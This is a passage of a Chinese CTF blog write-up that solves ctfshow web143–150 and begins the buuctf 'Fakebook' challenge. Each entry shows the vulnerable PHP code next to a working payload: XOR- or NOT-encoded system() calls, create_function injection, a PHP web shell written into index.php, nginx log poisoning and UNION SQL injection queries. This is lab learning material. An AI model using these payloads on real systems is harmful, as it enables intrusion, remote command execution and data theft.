class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\&#123;|\&#125;|\~|\%|\&amp;|\;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用异或</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v3=*(&quot;%0c%06%0c%0b%05%0d&quot;^&quot;%7f%7f%7f%7f%60%60&quot;)(&quot;%0b%01%03%00%06%00&quot;^&quot;%7f%60%60%20%60%2a&quot;)*&amp;v2=1</span><br></pre></td></tr></table></figure><h3 id="web144"><a href="#web144" class="headerlink" title="web144"></a>web144</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">check</span>(<span class="variable">$v3</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^\W+$/&#x27;</span>, <span class="variable">$v2</span>))&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"><span class="variable">$str</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">strlen</span>(<span class="variable">$str</span>)===<span class="number">1</span>?<span class="literal">true</span>:<span class="literal">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v3=-&amp;v2=(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)</span><br></pre></td></tr></table></figure><h3 id="web145"><a href="#web145" class="headerlink" title="web145"></a>web145</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>借用三目运算符即可</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v3=?(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5):&amp;v2=1</span><br></pre></td></tr></table></figure><h3 id="web146"><a href="#web146" class="headerlink" title="web146"></a>web146</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>]) &amp;&amp; <span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$v1</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v1&#x27;</span>];</span><br><span class="line">    <span class="variable">$v2</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v2&#x27;</span>];</span><br><span class="line">    <span class="variable">$v3</span> = (String)<span class="variable">$_GET</span>[<span class="string">&#x27;v3&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v1</span>) &amp;&amp; <span class="title function_ invoke__">is_numeric</span>(<span class="variable">$v2</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-z]|[0-9]|\@|\!|\:|\+|\-|\.|\_|\$|\&#125;|\%|\&amp;|\;|\&lt;|\&gt;|\*|\/|\^|\#|\&quot;/i&#x27;</span>, <span class="variable">$v3</span>))&#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;get out hacker!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            <span class="variable">$code</span> =  <span class="keyword">eval</span>(<span class="string">&quot;return <span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span>;&quot;</span>);</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;<span class="subst">$v1</span><span class="subst">$v3</span><span class="subst">$v2</span> = &quot;</span>.<span class="variable">$code</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>使用等号和位运算符</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?v1=1&amp;v3===(~%8c%86%8c%8b%9a%92)(~%8b%9e%9c%df%99%d5)||&amp;v2=1</span><br></pre></td></tr></table></figure><h3 id="web147"><a href="#web147" class="headerlink" title="web147"></a>web147</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$ctfshow</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-z0-9_]*$/isD&#x27;</span>,<span class="variable">$ctfshow</span>)) &#123;</span><br><span class="line">        <span class="variable">$ctfshow</span>(<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>参考这篇<a href="https://paper.seebug.org/755/">博文</a>绕过正则</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">get：</span><br><span class="line">/?show=echo 1;&#125;system(&#x27;tac flag.php&#x27;);//</span><br><span class="line">post：</span><br><span class="line">ctf=\create_function</span><br></pre></td></tr></table></figure><h3 id="web148"><a href="#web148" class="headerlink" title="web148"></a>web148</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_GET</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[A-Za-z0-9_\%\\|\~\&#x27;\,\.\:\@\&amp;\*\+\- ]+/&quot;</span>,<span class="variable">$code</span>))&#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    @<span class="keyword">eval</span>(<span class="variable">$code</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get_ctfshow_fl0g</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>没有过滤异或</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?code=(&quot;%08%02%08%09%05%0d&quot;^&quot;%7b%7b%7b%7d%60%60&quot;)(&quot;%09%01%03%01%06%02&quot;^&quot;%7d%60%60%21%60%28&quot;);</span><br></pre></td></tr></table></figure><p>也可以使用中文变量</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?code=$哈=&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;;$&#123;$哈&#125;[哼]($&#123;$哈&#125;[嗯]);&amp;哼=system&amp;嗯=tac f*</span><br><span class="line">&quot;`&#123;&#123;&#123;&quot;^&quot;?&lt;&gt;/&quot;; 异或出来的结果是 _GET</span><br></pre></td></tr></table></figure><h3 id="web149"><a href="#web149" class="headerlink" title="web149"></a>web149</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;ctf&#x27;</span>], <span class="variable">$_POST</span>[<span class="string">&#x27;show&#x27;</span>]);</span><br><span class="line"></span><br><span class="line"><span class="variable">$files</span> = <span class="title function_ invoke__">scandir</span>(<span class="string">&#x27;./&#x27;</span>); </span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$files</span> <span class="keyword">as</span> <span class="variable">$file</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">is_file</span>(<span class="variable">$file</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$file</span> !== <span class="string">&quot;index.php&quot;</span>) &#123;</span><br><span class="line">            <span class="title function_ invoke__">unlink</span>(<span class="variable">$file</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以直接往<code>index.php</code>里面写🐎，如果是别的文件就要利用竞争</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET：</span><br><span class="line">/?ctf=index.php</span><br><span class="line">POST：</span><br><span class="line">1=system(&#x27;cat /ctfshow_fl0g_here.txt&#x27;);&amp;show=&lt;?php eval($_POST[1]);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web150"><a href="#web150" class="headerlink" title="web150"></a>web150</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>日志包含，执行两次即可看到结果</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GET:</span><br><span class="line">/?isVIP=1</span><br><span class="line">POST:</span><br><span class="line">ctf=/var/log/nginx/access.log</span><br><span class="line"></span><br><span class="line">User-Agent:&lt;?php system(&#x27;tac f*&#x27;);?&gt;</span><br></pre></td></tr></table></figure><h3 id="web150-plus"><a href="#web150-plus" class="headerlink" title="web150_plus"></a>web150_plus</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CTFSHOW</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$vip</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="variable">$secret</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;vip = <span class="number">0</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;secret = <span class="variable">$flag</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;secret;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isVIP</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;vip?<span class="literal">TRUE</span>:<span class="literal">FALSE</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__autoload</span>(<span class="params"><span class="variable">$class</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$class</span>))&#123;</span><br><span class="line">            <span class="variable">$class</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">#过滤字符</span></span><br><span class="line"><span class="variable">$key</span> = <span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/\_| |\[|\]|\?/&#x27;</span>, <span class="variable">$key</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;error&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ctf</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;ctf&#x27;</span>];</span><br><span class="line"><span class="title function_ invoke__">extract</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">class_exists</span>(<span class="variable">$__CTFSHOW__</span>))&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;class is exists!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$isVIP</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>, <span class="string">&quot;:&quot;</span>)===<span class="literal">FALSE</span> &amp;&amp; <span class="title function_ invoke__">strrpos</span>(<span class="variable">$ctf</span>,<span class="string">&quot;log&quot;</span>)===<span class="literal">FALSE</span>)&#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$ctf</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>使用的<code>..CTFSHOW..</code>会被解析成<code>__CTFSHOW__</code>然后进行了变量覆盖，因为CTFSHOW是类就会使用__autoload()函数方法去加载phpinfo，flag在phpinfo中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/?..CTFSHOW..=phpinfo</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CTF_Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> Web </tag>
            
            <tag> ctfshow </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>buuctf Web 刷题记录 2</title>
      <link href="/2022/11/04/buuctf-web2/"/>
      <url>/2022/11/04/buuctf-web2/</url>
      
        <content type="html"><![CDATA[<h1 id="buuctf-Web-刷题记录-2"><a href="#buuctf-Web-刷题记录-2" class="headerlink" title="buuctf Web 刷题记录 2"></a>buuctf Web 刷题记录 2</h1><blockquote><p>参考：</p><p><a href="https://blog.csdn.net/Manuffer/article/details/120738755">无参数RCE总结</a></p><p><a href="http://www.pdsdt.lovepdsdt.com/index.php/2019/11/06/php_shell_no_code/">php无参数执行命令</a></p><p><a href="https://blog.csdn.net/m0_47418965/article/details/121708917">最全phpmyadmin漏洞汇总</a></p></blockquote><h2 id="网鼎杯-2018-Fakebook"><a href="#网鼎杯-2018-Fakebook" class="headerlink" title="[网鼎杯 2018]Fakebook"></a>[网鼎杯 2018]Fakebook</h2><p>访问<code>/robots.txt</code>发现备份文件<code>/user.php.bak</code></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UserInfo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$blog</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$name</span>, <span class="variable">$age</span>, <span class="variable">$blog</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$name</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = (<span class="keyword">int</span>)<span class="variable">$age</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;blog = <span class="variable">$blog</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$url</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line"></span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$url</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_RETURNTRANSFER, <span class="number">1</span>);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="variable">$httpCode</span> = <span class="title function_ invoke__">curl_getinfo</span>(<span class="variable">$ch</span>, CURLINFO_HTTP_CODE);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$httpCode</span> == <span class="number">404</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="number">404</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$output</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getBlogContents</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">get</span>(<span class="variable">$this</span>-&gt;blog);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValidBlog</span> (<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$blog</span> = <span class="variable language_">$this</span>-&gt;blog;</span><br><span class="line">        <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]&#123;2,6&#125;(\:[0-9]+)?(\/\S*)?$/i&quot;</span>, <span class="variable">$blog</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>curl_init()用来初始化一个curl会话，curl可以使用file伪协议读取文件。</p></blockquote><p>注册登陆后发现网页<code>/view.php?no=1</code>，存在<code>sql注入</code></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#版本 10.2.26-MariaDB-log </span><br><span class="line">/view.php?no=-1 union/**/select 1,version(),3,4%23</span><br><span class="line">#数据库 fakebook</span><br><span class="line">/view.php?no=-1 union/**/select 1,database(),3,4%23</span><br><span class="line">#表 users</span><br><span class="line">/view.php?no=-1 union/**/select 1,(select group_concat(table_name) from information_schema.tables where table_schema=&#x27;fakebook&#x27;),3,4%23</span><br><span class="line">#列 no,username,passwd,data</span><br><span class="line">/view.php?no=-1 union/**/select 1,(select group_concat(column_name) from information_schema.columns where table_name=&#x27;users&#x27;),3,4%23</span><br><span class="line">#内容 O:8:&quot;UserInfo&quot;:3:&#123;s:4:&quot;name&quot;;s:5:&quot;ADMIN&quot;;s:3:&quot;age&quot;;i:123;s:4:&quot;blog&quot;;s:62:&quot;http://0534be32-4335-4133-968c-fefec0550a80.node4.buuoj.cn:81/&quot;;&#125; </span><br><span class="line">/view.php?no=-1 union/**/select 1,(select group_concat(data) from users),3,4%23</span><br></pre></td></tr></table></figure><p>发现最后读出的内容是序列化后的数据，想到前面的<code>curl</code>可以使用<code>file</code>伪协议读取文件，故尝试读取<code>flag</code>文件</p><figure class="highlight php"><table><tr><td class="code"><pre><span 